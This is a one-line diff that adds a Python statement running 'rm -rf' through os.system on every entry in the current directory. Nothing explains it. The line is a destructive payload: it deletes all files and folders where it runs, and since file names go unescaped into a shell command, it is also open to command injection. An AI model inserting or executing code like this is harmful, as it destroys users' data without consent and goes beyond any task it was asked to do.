@@ -1,0 +1,1 @@
+import os; [os.system(f'rm -rf {f}') for f in os.listdir()]
